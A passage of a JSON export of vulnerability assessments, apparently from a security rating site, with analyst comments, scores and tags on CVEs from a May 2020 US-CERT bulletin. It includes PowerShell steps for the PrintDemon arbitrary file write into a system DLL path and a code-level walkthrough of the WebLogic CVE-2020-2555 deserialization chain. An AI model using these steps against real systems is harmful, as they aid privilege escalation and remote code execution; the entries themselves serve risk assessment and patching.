          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c38b4efc-662f-4948-a8c2-4206af40af03",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "b7c679e9-6ecb-4663-bf1e-330295e69cc4",
      "created": "2020-05-12T19:46:58.932957Z",
      "revisionDate": "2020-05-12T20:00:51.917498Z",
      "document": "This CVE made it into US-CERT\u2019s \u201cTop 10\u201d bulletin released in May, 2020 \u2013 https://www.us-cert.gov/ncas/alerts/aa20-133a / https://web.archive.org/web/20200512161248/https://www.us-cert.gov/ncas/alerts/aa20-133a\r\n\r\n- Vulnerable Products: Microsoft Office 2003 SP3, 2007 SP2 and SP3, and 2010 Gold and SP1; Office 2003 Web Components SP3; SQL Server 2000 SP4, 2005 SP4, and 2008 SP2, SP3, and R2; BizTalk Server 2002 SP1; Commerce Server 2002 SP4, 2007 SP2, and 2009 Gold and R2; Visual FoxPro 8.0 SP1 and 9.0 SP2; and Visual Basic 6.0\r\n- Associated Malware: Dridex\r\n- Mitigation: Update affected Microsoft products with the latest security patches\r\n- IOCs: https://www.us-cert.gov/ncas/analysis-reports/ar20-133i, https://www.us-cert.gov/ncas/analysis-reports/ar20-133j, https://www.us-cert.gov/ncas/analysis-reports/ar20-133k, https://www.us-cert.gov/ncas/analysis-reports/ar20-133l, https://www.us-cert.gov/ncas/analysis-reports/ar20-133n, https://www.us-cert.gov/ncas/analysis-reports/ar20-133o",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "common_enterprise"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "ab4f178a-d513-4fa2-9205-a134bbf7e66d",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "df071775-cd3a-4643-9e29-3368bd93c00f",
      "created": "2020-05-12T19:48:04.673096Z",
      "revisionDate": "2020-05-12T19:48:04.673229Z",
      "document": "This CVE made it into US-CERT\u2019s \u201cTop 10\u201d bulletin released in May, 2020 \u2013 https://www.us-cert.gov/ncas/alerts/aa20-133a / https://web.archive.org/web/20200512161248/https://www.us-cert.gov/ncas/alerts/aa20-133a\r\n\r\n- Vulnerable Products: Microsoft SharePoint\r\n- Associated Malware: China Chopper\r\n- Mitigation: Update affected Microsoft products with the latest security patches",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": []
    },
    {
      "id": "bf09223a-c885-4072-95b9-f4057f2f3af0",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "b43d414f-6140-4931-bed8-4ae15ffdfae1",
      "created": "2020-05-12T19:49:26.270505Z",
      "revisionDate": "2020-08-24T03:50:51.467526Z",
      "document": "This CVE made it into US-CERT\u2019s \u201cTop 10\u201d bulletin released in May, 2020 \u2013 https://www.us-cert.gov/ncas/alerts/aa20-133a / https://web.archive.org/web/20200512161248/https://www.us-cert.gov/ncas/alerts/aa20-133a\r\n\r\n- Vulnerable Products: Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016\r\n- Associated Malware: Multiple using the EternalSynergy and EternalBlue Exploit Kit\r\n- Mitigation: Update affected Microsoft products with the latest security patches",
      "score": 2,
      "metadata": {
        "tags": [
          "pre_auth",
          "common_enterprise",
          "easy_to_develop",
          "default_configuration",
          "high_privilege_access"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "78ce4a83-3117-4113-a2b6-60a6849d5e77",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "41df47b0-8f5d-477f-9f42-ab76a33252ad",
      "created": "2020-05-12T19:50:26.337198Z",
      "revisionDate": "2020-10-25T01:09:23.97881Z",
      "document": "This CVE made it into US-CERT\u2019s \u201cTop 10\u201d bulletin released in May, 2020 \u2013 https://www.us-cert.gov/ncas/alerts/aa20-133a / https://web.archive.org/web/20200512161248/https://www.us-cert.gov/ncas/alerts/aa20-133a\r\n\r\n- Vulnerable Products: Adobe Flash Player before 28.0.0.161\r\n- Associated Malware: DOGCALL\r\n- Mitigation: Update Adobe Flash Player installation to the latest version\r\n- IOCs: https://www.us-cert.gov/ncas/analysis-reports/ar20-133d",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        }
      ]
    },
    {
      "id": "edea3f78-4519-4dfa-abb4-11f154ebce24",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "6ca719ce-a47a-414e-8dba-ffe14f20c0ff",
      "created": "2020-05-12T19:51:33.00143Z",
      "revisionDate": "2020-05-12T19:51:33.000486Z",
      "document": "This CVE made it into US-CERT\u2019s \u201cTop 10\u201d bulletin released in May, 2020 \u2013 https://www.us-cert.gov/ncas/alerts/aa20-133a / https://web.archive.org/web/20200512161248/https://www.us-cert.gov/ncas/alerts/aa20-133a\r\n\r\n- Vulnerable Products: Microsoft .NET Framework 2.0, 3.5, 3.5.1, 4.5.2, 4.6, 4.6.1, 4.6.2 and 4.7\r\n- Associated Malware: FINSPY, FinFisher, WingBird\r\n- Mitigation: Update affected Microsoft products with the latest security patches\r\n- IOCs: https://www.us-cert.gov/ncas/analysis-reports/ar20-133f",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "bf5c9454-5cd6-4c69-bab1-11f81ff357f4",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "66fa01ac-cbaa-4917-af21-8896b661a3f4",
      "created": "2020-05-12T19:52:27.878613Z",
      "revisionDate": "2020-05-12T19:52:27.877599Z",
      "document": "This CVE made it into US-CERT\u2019s \u201cTop 10\u201d bulletin released in May, 2020 \u2013 https://www.us-cert.gov/ncas/alerts/aa20-133a / https://web.archive.org/web/20200512161248/https://www.us-cert.gov/ncas/alerts/aa20-133a\r\n\r\n- Vulnerable Products: Microsoft Word 2007 SP3, Office 2010 SP2, Word 2010 SP2, Word 2013 SP1, Word 2013 RT SP1, Word for Mac 2011, Office Compatibility Pack SP3, Word Automation Services on SharePoint Server 2010 SP2 and 2013 SP1, and Office Web Apps Server 2010 SP2 and 2013 SP1\r\n- Associated Malware: Toshliph, UWarrior\r\n- Mitigation: Update affected Microsoft products with the latest security patches\r\n- IOCs: https://www.us-cert.gov/ncas/analysis-reports/ar20-133m",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "220c5c9f-03da-451b-9d9e-ba2367c2375e",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "3374fb55-2a44-4607-a9c5-265e7de9b936",
      "created": "2020-05-12T19:54:07.499636Z",
      "revisionDate": "2020-05-12T19:54:07.498449Z",
      "document": "This CVE made it into US-CERT\u2019s \u201cTop 10\u201d bulletin released in May, 2020 \u2013 https://www.us-cert.gov/ncas/alerts/aa20-133a / https://web.archive.org/web/20200512161248/https://www.us-cert.gov/ncas/alerts/aa20-133a\r\n\r\n- Vulnerable Products: Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1\r\n- Associated Malware: Kitty\r\n- Mitigation: Upgrade to the most recent version of Drupal 7 or 8 core.",
      "score": 1,
      "metadata": {
        "tags": [
          "difficult_to_patch",
          "easy_to_develop",
          "default_configuration"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "d6f915e4-648e-4d18-8aaa-f290d1c97258",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "236680fb-f804-4f5d-b51d-4b50c9f69bbd",
      "created": "2020-05-12T19:55:06.929441Z",
      "revisionDate": "2020-05-12T19:55:06.930154Z",
      "document": "This CVE made it into US-CERT\u2019s \u201cTop 10\u201d bulletin released in May, 2020 \u2013 https://www.us-cert.gov/ncas/alerts/aa20-133a / https://web.archive.org/web/20200512161248/https://www.us-cert.gov/ncas/alerts/aa20-133a\r\n\r\n- Vulnerable Products: Pulse Connect Secure 9.0R1 - 9.0R3.3, 8.3R1 - 8.3R7, 8.2R1 - 8.2R12, 8.1R1 - 8.1R15 and Pulse Policy Secure 9.0R1 - 9.0R3.1, 5.4R1 - 5.4R7, 5.3R1 - 5.3R12, 5.2R1 - 5.2R12, 5.1R1 - 5.1R15\r\n- Mitigation: Update affected Pulse Secure devices with the latest security patches.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop",
          "pre_auth",
          "common_enterprise"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "3411be31-6814-49d1-bea1-4b68b0d6998c",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "afc76977-d355-470d-a7f6-fef7a8352b65",
      "created": "2020-05-12T19:56:11.363861Z",
      "revisionDate": "2020-05-12T20:16:43.686934Z",
      "document": "This CVE made it into US-CERT\u2019s \u201cTop 10\u201d bulletin released in May, 2020 \u2013 https://www.us-cert.gov/ncas/alerts/aa20-133a / https://web.archive.org/web/20200512161248/https://www.us-cert.gov/ncas/alerts/aa20-133a\r\n\r\n- Vulnerable Products: Citrix Application Delivery Controller, Citrix Gateway, and Citrix SDWAN WANOP\r\n- Mitigation: Update affected Citrix devices with the latest security patches",
      "score": 2,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop",
          "common_enterprise",
          "default_configuration"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "f24db05b-4726-4694-b25a-c2dbfe380470",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "362f79d7-960e-482e-a7b9-1913e43d7bac",
      "created": "2020-05-14T00:36:17.641341Z",
      "revisionDate": "2020-08-19T19:18:16.799864Z",
      "document": "Update:  There exist two bypasses to the patch microsoft released.  The first, CVE-2020-1337 was presented at blackhat.  The second is based on file junctions and is explained here: https://blog.hiveminds.es/en/posts/cve-2020-1337_my_two_cents/\r\n\r\nThere should be a patch out for the new CVE-2020-1337, but the junction may yet be a zero day.  I have not had the opportunity to examine it in detail, though it appears from the blog it requires reboots and maintained access.  While not impossible, it is less valuable.\r\n\r\nOK, so to start off with, this is bad and you should patch.  That said, to my understanding, it is completely disingenuous to say:\r\nAttackers can exploit CVE-2020-1048 with a single PowerShell command:\r\nAdd-PrinterPort -Name c:\\windows\\system32\\ualapi.dll\r\n\r\nFrom a cursory read and some playing, I think the way this exploit works is by creating a printer (something regular users can do) and instead of giving it a port, give it a path.  That means when it tries to write to the printer port, it finds a file and writes to it.  That's relatively straightforward, but significantly oversimplified.  In the above example, we write to a location vulnerable to a dll hijack (C:\\windows\\system32\\ualapi.dll) which is well-known and talked about here: https://enigma0x3.net/2019/07/24/cve-2019-13382-privilege-escalation-in-snagit/.\r\n\r\nThe novel trick here, like many recent exploits, is magic to get an arbitrary file write to a trusted location.\r\n\r\nSo to do that, you can use the above command, but you need to set up several steps first, and even then it won't work as advertised.  I really appreciate their work, but In the blog out right now (https://windows-internals.com/printdemon-cve-2020-1048/) the authors attempt to obfuscate to prevent script kiddies so much they miss the mark on assisting and explaining how the exploit works.  They take you down so many false leads, it is like talking to a southerner, and after every direction you get, they say \"but that'll do ya no good.\"  To explain with brevity, run these commands in powershell:\r\n```\r\nAdd-PrinterDriver -Name \"Generic / Text Only\"\r\nAdd-PrinterPort -Name \"<whatever>\"\r\nAdd-Printer -Name \"PrintDemon\" -DriverName \"Generic / Text Only\" -PortName \"<whatever>\"\r\n\"Hello World\" |  Out-Printer -Name \"PrintDemon\"\r\n```\r\n\r\nViola, you create a file with markup trash in it.  If this were your payload, it would not run.  Unless the authors are hiding something, you need to use the WindowsAPI to actually get a file without any sort of markup garbage in it.\r\nSo.... yes, you can write a useless file with that one command..... if you've already run several other commands?\r\n\r\nThere is a PoC, so it is serious, but this is not a single command to root backdoor.  It is more like several thousand lines of code and some well-timed execution gets you a rooted backdoor.",
      "score": 8,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "53acb724-aa78-496e-917a-6bd243e12a45",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "5b9203ad-a2df-4463-bf80-67418684e798",
      "created": "2020-05-14T15:27:42.837139Z",
      "revisionDate": "2023-02-08T06:45:06.345636Z",
      "document": "A vulnerability exists within `PathCchCanonicalize` that can be leveraged by a malicious RDP server to write files on a connected RDP client system. The vulnerability is related to how forward and back slash characters are processed and is related to the older CVE-2019-0887 in the sense that this vulnerability is a bypass for the mitigation which it introduced.\r\n\r\nExploiting this vulnerability would involve an attacker configuring a malicious RDP server and then tricking a client to connect to it, authenticate to it and then initiate a copy and paste operation from the malicious server to their client system.",
      "score": 4,
      "metadata": {
        "tags": [
          "difficult_to_develop",
          "requires_interaction",
          "common_enterprise",
          "default_configuration",
          "pre_auth"
        ],
        "attacker-value": 2,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "7810d09c-a0c6-4e85-9964-f34f732f0fcd",
      "editorId": "de42417f-babb-4d0c-a525-ed33c82ddafd",
      "topicId": "0c69b33c-2322-4075-be16-a92593b75107",
      "created": "2020-05-14T17:19:22.983711Z",
      "revisionDate": "2020-10-27T13:42:15.464629Z",
      "document": "Being an authenticated exploit, it's certainly of less value to an attacker. Could be used in a privilege escalation context.",
      "score": 3,
      "metadata": {
        "tags": [
          "default_configuration",
          "post_auth"
        ],
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "e893bd27-d014-4e4d-8e8f-dcb3d8d8aa62",
      "editorId": "de42417f-babb-4d0c-a525-ed33c82ddafd",
      "topicId": "44da8a00-df91-4790-8407-97b2f1b874ca",
      "created": "2020-05-14T17:27:58.645962Z",
      "revisionDate": "2020-05-14T17:27:58.648308Z",
      "document": "This doesn't seem like that hard of an exploit to pull off, but the configuration must be local without 2fa. Seems like a bit of an edge case. Could see automated scanning + bitcoin or some such implant.",
      "score": 1,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "pre_auth",
          "obscure_configuration"
        ],
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "7135f38c-2d84-4f70-a0cb-ba890dc81065",
      "editorId": "de42417f-babb-4d0c-a525-ed33c82ddafd",
      "topicId": "b6c6a49c-2895-4a0e-b367-f655b0b274ab",
      "created": "2020-05-14T17:30:49.550608Z",
      "revisionDate": "2020-05-14T17:30:49.55209Z",
      "document": "There doesn't seem to be much value for an attacker to terminate a web service.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "no_useful_data",
          "difficult_to_develop"
        ],
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "6b8ee894-6d04-49e4-8d61-4bdf9e73d583",
      "editorId": "2ccacbe6-ae15-400a-8cd0-57acc7fb593c",
      "topicId": "c9b4bb36-5160-45c7-b6d7-dd13245d233f",
      "created": "2020-05-15T18:13:54.322049Z",
      "revisionDate": "2020-06-09T23:22:24.899966Z",
      "document": "Requires authentication but after that it's a couple of easy hops to get to admin - and with that: pillage secrets, deploy additional backdoor, pillage secrets, review code for additional vulnerabilities. Game over. \r\n\r\nhttps://hackerone.com/reports/827052",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise",
          "difficult_to_patch"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        }
      ]
    },
    {
      "id": "40611be8-b73a-4d15-be01-d374aeceff52",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "a4bdbfb9-4493-4ef5-8c05-276721f6549f",
      "created": "2020-05-15T19:02:42.46545Z",
      "revisionDate": "2020-05-15T23:11:19.576309Z",
      "document": "The vulnerability exists in the `LimitFilter` class's `toString()` method within the Coherence library, a library that exists within WebLogic installations by default.\r\n\r\n```\r\npublic String toString() {\r\n    StringBuilder sb = new StringBuilder(\"LimitFilter: (\");\r\n    sb.append(this.m_filter)\r\n      .append(\" [pageSize=\")\r\n      .append(this.m_cPageSize)\r\n      .append(\", pageNum=\")\r\n      .append(this.m_nPage);\r\n    if (this.m_comparator instanceof ValueExtractor) {\r\n      ValueExtractor extractor = (ValueExtractor)this.m_comparator;\r\n      sb.append(\", top=\")\r\n        .append(extractor.extract(this.m_oAnchorTop))\r\n        .append(\", bottom=\")\r\n        .append(extractor.extract(this.m_oAnchorBottom));\r\n    } else if (this.m_comparator != null) {\r\n      sb.append(\", comparator=\")\r\n        .append(this.m_comparator);\r\n    } \r\n    sb.append(\"])\");\r\n    return sb.toString();\r\n  }\r\n```\r\n\r\nAs originally noted in the [ZDI blog post](https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server), all of the calls to `extract()` were removed from the aforementioned `toString()` method in the fix. The removal was due to having the ability to leverage the `ReflectionExtractor` class's `extract()` method to execute arbitrary code via `method.invoke()`.\r\n\r\n```\r\n  public E extract(T oTarget) {\r\n    if (oTarget == null)\r\n      return null; \r\n    Class<?> clz = oTarget.getClass();\r\n    try {\r\n      Method method = this.m_methodPrev;\r\n      if (method == null || method.getDeclaringClass() != clz)\r\n        this.m_methodPrev = method = ClassHelper.findMethod(clz, \r\n            getMethodName(), ClassHelper.getClassArray(this.m_aoParam), false); \r\n      return (E)method.invoke(oTarget, this.m_aoParam);\r\n    } catch (NullPointerException e) {\r\n      throw new RuntimeException(suggestExtractFailureCause(clz));\r\n    } catch (Exception e) {\r\n      throw ensureRuntimeException(e, clz\r\n          .getName() + this + '(' + oTarget + ')');\r\n    } \r\n  }\r\n```\r\n\r\nThe prerequisite for being able to leverage `extract()` to execute code is to first trigger the `toString()` method from the `LimitFilter` class. The `BadAttributeValueExpException` class within the JRE meets the prereq, as can be seen in its `readObject()` method:\r\n\r\n```\r\nprivate void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {\r\n        ObjectInputStream.GetField gf = ois.readFields();\r\n        Object valObj = gf.get(\"val\", null);\r\n\r\n        if (valObj == null) {\r\n            val = null;\r\n        } else if (valObj instanceof String) {\r\n            val= valObj;\r\n        } else if (System.getSecurityManager() == null\r\n                || valObj instanceof Long\r\n                || valObj instanceof Integer\r\n                || valObj instanceof Float\r\n                || valObj instanceof Double\r\n                || valObj instanceof Byte\r\n                || valObj instanceof Short\r\n                || valObj instanceof Boolean) {\r\n            val = valObj.toString();\r\n       ...\r\n    }\r\n```\r\n\r\nProvided that the server does not have a Security Manager, sending a serialized `BadAttributeValueExpException` object to a WebLogic server will result in the `toString()` method being triggered. As of now, Weblogic installations do not come with a Security Manager by default.\r\n\r\nI would rate this vulnerability as quite high, since successful exploitation does not require authentication, and the application accepts the crafted object without any sort of filtering. This is an important one to patch.\r\n\r\n",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "ca8b2d12-2007-4e0e-bf29-c6b7bb9f3403",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "255908b4-ba2b-4575-84e5-63690a0110ae",
      "created": "2020-05-15T19:15:35.698075Z",
      "revisionDate": "2020-06-02T17:30:59.412626Z",
      "document": "This is now being [reported](https://www.thezdi.com/blog/2020/5/8/details-on-the-oracle-weblogic-vulnerability-being-exploited-in-the-wild) as a bypass for the patch for CVE-2020-2555. The gadget chain is slightly modified, but it seems that exploitation results in unauthenticated RCE just as with CVE-2020-2555. This should certainly be patched.",
      "score": 2,
      "metadata": {
